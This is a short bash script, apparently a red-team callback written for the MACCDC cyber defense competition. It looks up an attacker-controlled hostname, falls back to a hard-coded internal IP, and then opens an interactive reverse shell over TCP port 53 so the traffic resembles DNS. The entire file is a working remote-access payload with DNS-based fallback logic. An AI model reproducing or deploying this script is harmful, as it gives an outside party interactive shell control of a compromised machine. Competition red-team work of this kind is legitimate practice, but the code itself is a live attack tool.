#!/bin/bash

server="suspiciouslow.isamotherfucking.ninja"
#fallback="192.168.3.3"
fallback="10.0.0.100"


#Removed target for MACCDC (no internet)
#ipaddr=`dig @8.8.8.8 +short $server 2>/dev/null | xargs`
ipaddr=`dig +short $server 2>/dev/null | xargs`
#Finding Current IP of Server
regex='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'
if [[ $ipaddr =~ $regex ]]
then
        :
else
	#Removed target for MACCDC (no internet)
        #ipaddr=`dig @8.8.4.4 +short $server 2>/dev/null | xargs`
        ipaddr=`dig +short $server 2>/dev/null | xargs`
        if [[ $ipaddr =~ $regex ]]
        then
                :
        else
                ipaddr=$fallback
        fi
fi

bash -i >& /dev/tcp/$ipaddr/53 0>&1
